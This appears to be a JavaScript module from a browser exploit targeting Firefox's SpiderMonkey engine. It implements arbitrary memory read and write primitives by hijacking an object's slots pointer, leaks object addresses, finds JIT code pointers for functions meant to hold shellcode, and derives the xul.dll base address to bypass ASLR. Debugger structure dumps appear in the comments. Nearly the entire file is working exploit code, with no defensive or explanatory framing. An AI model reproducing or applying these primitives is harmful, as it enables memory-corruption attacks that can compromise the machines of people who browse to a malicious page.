/*//////
////////
// Exploit primitives
///////*/

function WeakLeakDbl(TargetAddress) {
    var SavedSlotsPtrDbl = LeakSlotsPtr();
    SetSlotsPtr(TargetAddress);
    var LeakedDbl = MutableArray.x;
    SetSlotsPtr(SavedSlotsPtrDbl);
    return LeakedDbl;
}

function WeakWriteDbl(TargetAddress, Val) { 
    var SavedSlotsPtrDbl = LeakSlotsPtr();
    SetSlotsPtr(TargetAddress);
    MutableArray.x = Val;
    SetSlotsPtr(SavedSlotsPtrDbl);
}

function WeakLeakObjectAddress(Obj) {
    //                                             x                       y                        z
    // MutableArray.NativeObj.SlotsPtr -> [0x????????????????] | [Target object address] | [0x????????????????]
    MutableArray.y = Obj;

    //                                             x                       y                        z
    // MutableArray.NativeObj.SlotsPtr -> [0x????????Target o] | [bject adress????????] | [0x????????????????]
    
    var SavedSlotsPtrDbl = LeakSlotsPtr();
    HelperDbl[0] = SavedSlotsPtrDbl;
    HelperDword[0] = HelperDword[0] + 4;
    SetSlotsPtr(HelperDbl[0]);
    
    // Patch together a double of the target object address from the two 32-bit property values
    
    HelperDbl[0] = MutableArray.x;
    var LeakedLow = HelperDword[1];
    HelperDbl[0] = MutableArray.y; // Works in release, not in debug (assertion issues)
    var LeakedHigh = HelperDword[0] & 0x00007fff; // Filter off tagged pointer bits
    SetSlotsPtr(SavedSlotsPtrDbl);
    HelperDword[0] = LeakedLow;
    HelperDword[1] = LeakedHigh;
    
    return HelperDbl[0];
}

var ExplicitDwordArray = new Uint32Array(10); // Used for the strong write
var ExplicitDwordArrayDataPtr = null; // Save the pointer to the data pointer so we don't have to recalculate it each read
var ExplicitDblArray = new Float64Array(1); // Used for the strong read
var ExplicitDblArrayDataPtr = null; // Save the pointer to the data pointer so we don't have to recalculate it each read
var ExplicitWordArray = new Uint16Array(10); // Used for the strong read
var ExplicitWordArrayDataPtr = null; // Save the pointer to the data pointer so we don't have to recalculate it each read

function InitStrongRWPrimitive() {
	// Leak data view pointers from the ExplicitDwordArray and ExplicitDwordArray ArrayBuffer struct
	
    HelperDbl[0] = WeakLeakObjectAddress(ExplicitDblArray);
	//DebugLog("Float64Array NativeObject: 0x" + HelperDword[1].toString(16) + HelperDword[0].toString(16));
    HelperDword[0] = HelperDword[0] + 0x38; // Float64Array data view pointer (same as ArrayBuffer)
    ExplicitDblArrayDataPtr = HelperDbl[0];
	
    HelperDbl[0] = WeakLeakObjectAddress(ExplicitDwordArray);
    HelperDword[0] = HelperDword[0] + 0x38; // Uint32Array data view pointer (same as ArrayBuffer)
    ExplicitDwordArrayDataPtr = HelperDbl[0];
	
	HelperDbl[0] = WeakLeakObjectAddress(ExplicitWordArray);
    HelperDword[0] = HelperDword[0] + 0x38; // Uint16Array data view pointer (same as ArrayBuffer)
    ExplicitWordArrayDataPtr = HelperDbl[0];
	HelperDbl[0] = WeakLeakDbl(HelperDbl[0]); // In the event initialization failed, the first read will return the initial marker data in the x y and z slots of the MutableArray
	
	if(HelperDword[0] == 0x41414141) {
        DebugLog("Arbitrary read primitive failed");
        window.location.reload();
        return 0.0;
    }
}

function ExplicitLeakDbl(TargetAddress) {
    WeakWriteDbl(ExplicitDblArrayDataPtr, TargetAddress);
    return ExplicitDblArray[0];
}

function StrongWriteDword(TargetAddress, Value) {
    WeakWriteDbl(ExplicitDwordArrayDataPtr, TargetAddress);
    ExplicitDwordArray[0] = Value;
}

function StrongLeakWord(TargetAddress){
    WeakWriteDbl(ExplicitWordArrayDataPtr, TargetAddress);
    return ExplicitWordArray[0];
}

function StrongLeakDword(TargetAddress){
    WeakWriteDbl(ExplicitDwordArrayDataPtr, TargetAddress);
    return ExplicitDwordArray[0];
}

function GetJSFuncJITInfoPtr(JSFuncObj) {
    HelperDbl[0] = WeakLeakObjectAddress(JSFuncObj); // The JSFunction object address associated with the (now JIT compiled) shellcode data.
    HelperDword[0] = HelperDword[0] + 0x30; // JSFunction.u.native.extra.jitInfo_ contains a pointer to the +RX JIT region at offset 0 of its struct.
    var JITInfoAddress = WeakLeakDbl(HelperDbl[0]);
    return JITInfoAddress;
}

function GetJSFuncJITCodePtr(JSFuncObj) {
    var JITInfoAddress = GetJSFuncJITInfoPtr(JSFuncObj);
    
    if(JITInfoAddress) {
        var JITCodePtr = WeakLeakDbl(JITInfoAddress); // Leak the address to the compiled JIT assembly code associated with the JIT'd shellcode function from its JitInfo struct (it is a pointer at offset 0 of this struct)
        return JITCodePtr;
    }
    
    return 0.0;
}

/*
function DiveModuleBase64(TargetAddress) {
	HelperDbl[0] = TargetAddress;
    HelperDword[0] = (HelperDword[0] & 0xFFFF0000) + 0x4e; // Offset of "This program cannot be run in DOS mode" in PE header.
    CurrentAddress = HelperDbl[0];
	//DebugLog("Filtered address: 0x" + HelperDword[1].toString(16) + HelperDword[0].toString(16));
	// 0x7ffc24c2004e 00007FFC1FEE0000
	
	for(let x = 0; x < 20000; x++) {
        if(StrongLeakWord(CurrentAddress) == 0x6854) { // 'hT'
			HelperDbl[0] = CurrentAddress;
			HelperDword[0] = HelperDword[0] + 2;
			CurrentAddress = HelperDbl[0];
			
			if(StrongLeakWord(CurrentAddress) == 0x7369) { // 'si'
				HelperDbl[0] = CurrentAddress;
				HelperDword[0] = HelperDword[0] - 0x4e;
				CurrentAddress = HelperDbl[0];
                return CurrentAddress;
            }
        }
		
		HelperDbl[0] = CurrentAddress;
        HelperDword[0] = HelperDword[0] - 0x10000;
		CurrentAddress = HelperDbl[0];
    }
    
	DebugLog("Failed to find module base by dive");
	HelperDbl[0] = CurrentAddress;
	DebugLog("Next address: 0x" + HelperDword[1].toString(16) + HelperDword[0].toString(16));
    return 0.0;
}
*/

function LeakXulBase() {
	/*
	Float64Array NativeObject
	
	struct NativeObject {
		void *GroupPtr;
		void *ShapePtr;
		void *SlotsPtr;
		void *ElementsPtr; // This does NOT point to the element metadata, it points OVER it to the actual element data itself.
	}

	0000029E4C834290  0000029E4EDA9AC1  Á.ÚN....  <- Group pointer
	0000029E4C834298  0000029E4C831200  ...L....  
	0000029E4C8342A0  0000000000000000  ........  
	0000029E4C8342A8  00007FFAFB9B1BB0  °..ûú...  <- Element pointer (xul.dll base: 00007FFAF73F0000)
	
	0:000> dt js::NativeObject 0x016c8d201cc0
	   +0x000 group_           : js::GCPtr<js::ObjectGroup *>
	   +0x008 shapeOrExpando_  : 0x0000016c`8daac970 Void
	   +0x010 slots_           : (null) 
	   +0x018 elements_        : 0x00007ff7`f7ecdac0 js::HeapSlot

	0:000> dt js!js::GCPtr<js::ObjectGroup *> 0x16c8d201cc0
	   +0x000 value            : 0x0000016c`8da7ad30 js::Ob

	0:000> dt js!js::ObjectGroup 0x0000016c`8da7ad30
	   +0x000 clasp_           : 0x00007ff7`f7edc510 js::Class
	   +0x008 proto_           : js::GCPtr<js::TaggedProto>
	   +0x010 realm_           : 0x0000016c`8d92a800 JS::Realm
	   +0x018 flags_           : 1
	   +0x020 addendum_        : (null) 
	   +0x028 propertySet      : (null) 

	0:000> dt js!js::Class 0x00007ff7`f7edc510 
	   +0x000 name             : 0x00007ff7`f7f8e0e8  "Uint8Array"
	   +0x008 flags            : 0x65200303
	   +0x010 cOps             : 0x00007ff7`f7edc690 js::ClassOps
	   +0x018 spec             : 0x00007ff7`f7edc730 js::ClassSpec
	   +0x020 ext              : 0x00007ff7`f7edc930 js::ClassExtension
	   +0x028 oOps             : (null) 
	*/
	
	const Target = new Uint8Array(1);
	const NativeObjAddress = WeakLeakObjectAddress(Target);
	const ObjectGroup = WeakLeakDbl(NativeObjAddress);
	const Clasp = WeakLeakDbl(ObjectGroup);
	const ClassName = WeakLeakDbl(Clasp);
	var LeakedXulAddress = HelperDbl[0] = ClassName;
	
	//DebugLog("Leaked NativeObj address: 0x" + HelperDword[1].toString(16) + HelperDword[0].toString(16));
	HelperDword[0] = HelperDword[0] - 0x4D49785;
	LeakedXulAddress = HelperDbl[0];
	//DebugLog("Leaked xul.dll base from delta: 0x" + HelperDword[1].toString(16) + HelperDword[0].toString(16));
	
	//00007FFC1FEE004E  6F72702073696854  This pro
	//LeakedXulAddress = HelperDbl[0] = DiveModuleBase64(LeakedXulAddress); // In multiples of 0x10000, this will require 1236 iterations of reads to hit the base
	//DebugLog("Leaked xul.dll base from dive: 0x" + HelperDword[1].toString(16) + HelperDword[0].toString(16));
	
	return LeakedXulAddress;
}